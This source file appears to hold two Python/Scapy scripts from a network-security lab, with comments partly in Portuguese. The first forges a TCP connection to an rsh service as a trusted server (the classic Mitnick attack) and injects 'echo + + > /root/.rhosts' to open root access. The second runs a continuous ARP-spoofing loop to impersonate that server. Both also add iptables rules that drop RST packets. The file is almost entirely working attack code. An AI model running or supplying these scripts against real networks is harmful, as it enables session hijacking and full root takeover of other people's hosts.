from scapy.all import *
import os

# Function packet_callback
def packet_callback(packet):
    # Check if the packet has a TCP layer and is receiving to port 514
    if packet.haslayer(TCP):
        if packet[TCP].sport == 514:
            # Check if the packet is a SYN-ACK
            if packet[TCP].flags == 18:
                print(f"Received SYN-ACK from {packet[IP].src}:{packet[TCP].sport}")
                # Construct the ACK packet
                ack = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags='A', seq=packet[TCP].ack, ack=packet[TCP].seq + 1, window=packet[TCP].window)

                # Send the ACK packet
                send(ack)
                print(f"Sent ACK to {packet[IP].src}:{packet[TCP].sport}")
                
                # Construct the RSH packet
                command = "echo + + > /root/.rhosts"
                rsh_payload = f"9090\x00root\x00root\x00{command}\x00"
                rsh = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags='PA', seq=packet[TCP].ack, ack=packet[TCP].seq + 1, window=packet[TCP].window) / Raw(load=rsh_payload)
                # Send the RSH packet
                send(rsh)
                print(f"Sent RSH command to {packet[IP].src}:{packet[TCP].sport}")

        # Check if the packet has a TCP layer and is sending from port 9090
        if packet[TCP].dport == 9090:
            # Check if the packet is a SYN
            if packet[TCP].flags == 2:
                print(f"Received SYN from {packet[IP].src}:{packet[TCP].sport}")
                # Construct the SYN-ACK packet
                syn_ack = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags='SA', seq=12345, ack=packet[TCP].seq + 1)

                # Send the SYN-ACK packet
                send(syn_ack)
                print(f"Sent SYN-ACK to {packet[IP].src}:{packet[TCP].sport}")

# Function sniff_packets
def sniff_packets(interface):
    # Sniff the network
    print(f"Sniffing on interface {interface}")
    sniff(iface=interface, prn=packet_callback, store=0)

if __name__ == "__main__":
    os.system(f'iptables -A FORWARD -p tcp --tcp-flags RST RST -j DROP')

    # Configuration
    x_ip = '10.9.0.5'  # X-Terminal IP address
    x_port = 514       # X-Terminal port number
    global srv_ip
    srv_ip = '10.9.0.6' # Trusted server IP address
    srv_port = 1023    # Trusted server port number

    interface = 'br-ac675edd1345' # (MODIFICAR AQUI)

    # Create a thread to sniff the network
    t = threading.Thread(target=sniff_packets, args=(interface,))
    t.start()

    # Construct the initial SYN packet
    syn = IP(src=srv_ip, dst=x_ip)/TCP(dport=x_port, sport=srv_port, flags='S', seq=666)
    # Send the SYN packet and receive SYN-ACK
    send(syn)

    # Wait for the thread to finish
    t.join()
import scapy.all as scapy
from time import sleep
import os
import signal
import threading

def arp_spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    # Prepara o pacote para atualizar o ARP:
    # OP do tipo 2 define uma resposta ARP (ARP reply);
    # PSRC define o endereço IP de origem no pacote como o IP que o atacante está se passando;
    # HWSRC define o endereço MAC de origem no pacote como o MAC do atacante;
    # PDST define o endereço IP de destino no pacote como o IP do alvo;
    # HWDST define o endereço MAC de destino no pacote como o MAC do alvo.
    packet = scapy.ARP(op=2, psrc=spoof_ip, hwsrc=attacker_mac, pdst=target_ip, hwdst=target_mac)

    while True: # Loop que fica impedindo o Servidor de retomar seu local de direito
        scapy.send(packet, verbose=False)
        sleep(0.1)

def signal_handler(sig, frame):
    print("\nARP spoofing stopped.")
    os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
    exit(0)

if __name__ == '__main__':
    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")

    s_ip = '10.9.0.6'                           # De fato, o IP do Trusted Server
    xt_ip = '10.9.0.5'                          # De fato, o IP do X-Terminal
    attacker_mac = '02:42:47:41:de:9c'          # Attacker MAC (MODIFICAR AQUI)
    xt_mac = '02:42:0a:09:00:05'                # X-Terminal MAC
    server_mac = '02:42:0a:09:00:06'            # Trusted Server MAC

    print("ARP spoofing started. Press Ctrl+C to stop.")

    try:
        # Start spoofing the X-Terminal
        arp_spoof(xt_ip, xt_mac, s_ip, attacker_mac)
    except KeyboardInterrupt:
        signal_handler(signal.SIGINT, None)